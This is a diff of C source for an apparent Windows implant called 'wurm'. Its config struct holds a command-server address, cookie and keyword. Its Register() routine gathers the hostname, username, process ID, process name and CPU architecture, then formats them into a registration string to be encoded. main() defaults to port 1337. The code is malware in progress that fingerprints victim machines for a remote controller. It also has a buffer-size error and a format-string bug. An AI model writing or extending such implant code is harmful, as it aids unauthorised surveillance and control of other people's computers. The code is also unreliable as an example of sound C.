@@ -5,24 +5,25 @@
 
 struct {
     struct {
-        CHAR*   address;
-        CHAR*   path;
-        CHAR*   user_agent;
+        CHAR* address;
+        CHAR* path;
+        CHAR* user_agent;
         INT     port;
     } http;
     struct {
-        CHAR*   cookie;
-        CHAR*   keyword;
+        CHAR* cookie;
+        CHAR* keyword;
     } auth;
     struct {
-        CHAR*   status;
-        CHAR*   format;
+        CHAR* status;
+        CHAR* format;
     } data;
     struct {
-        CHAR*   name;
+        CHAR* name;
         CHAR    hostname[MAX_PATH];
         CHAR    username[MAX_PATH];
         CHAR    arch[MAX_PATH];
+        CHAR    product[MAX_PATH];
         DWORD   pid;
     } info;
 } wurm;
@@ -38,26 +39,29 @@ void Register() {
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
     // Set data allocation format
-    wurm.data.status = "";
-    wurm.data.format = "";
+    wurm.data.status = "register";
+    wurm.data.format = "%s:%s";
 
     // Enumerate local machine for information
     if (GetComputerNameA(wurm.info.hostname, &default_length)) {
         printf("Hostname: %s\n", wurm.info.hostname);
-    } else {
+    }
+    else {
         printf("Error: %lu\n", dw_error);
     }
 
     if (GetUserNameA(wurm.info.username, &default_length)) {
         printf("Username: %s\n", wurm.info.username);
-    } else {
+    }
+    else {
         printf("Error: %lu\n", dw_error);
     }
 
     if (GetCurrentProcessId()) {
         wurm.info.pid = GetCurrentProcessId();
         printf("Process ID: %lu\n", wurm.info.pid);
-    } else {
+    }
+    else {
         printf("Error: %lu\n", dw_error);
     }
 
@@ -68,15 +72,32 @@ void Register() {
                 printf("Process Name: %s\n", wurm.info.name);
             }
         }
-    } else {
+    }
+    else {
         printf("Error: %lu\n", dw_error);
     }
 
     if (GetEnvironmentVariableA("PROCESSOR_ARCHITECTURE", wurm.info.arch, default_length)) {
         printf("Operating System Arch: %s\n", wurm.info.arch);
-    } else {
+    }
+    else {
         printf("Error: %lu\n", dw_error);
     }
+
+    // Allocate memory to be encoded
+    /*
+    Registration data structure:
+
+    */
+    INT data_length = strlen(wurm.data.format) + strlen(wurm.data.status) + strlen(wurm.info.hostname);
+    CHAR* data_to_encode = malloc(data_length);
+    sprintf_s(data_to_encode, data_length, wurm.data.format, wurm.data.status, wurm.info.hostname);
+
+    printf(data_to_encode);
+
+    // Clean up memory and handles
+    CloseHandle(snapshot);
+    free(data_to_encode);
 }
 
 int main(int argc, char* argv[]) {
@@ -84,11 +105,13 @@ int main(int argc, char* argv[]) {
         wurm.http.address = argv[1];
         wurm.http.port = 1337;
 
-    } else if (argc == 3) {
+    }
+    else if (argc == 3) {
         wurm.http.address = argv[1];
         wurm.http.port = atoi(argv[2]);
 
-    } else {
+    }
+    else {
         wurm.http.address = "127.0.0.1";
         wurm.http.port = 1337;
     }
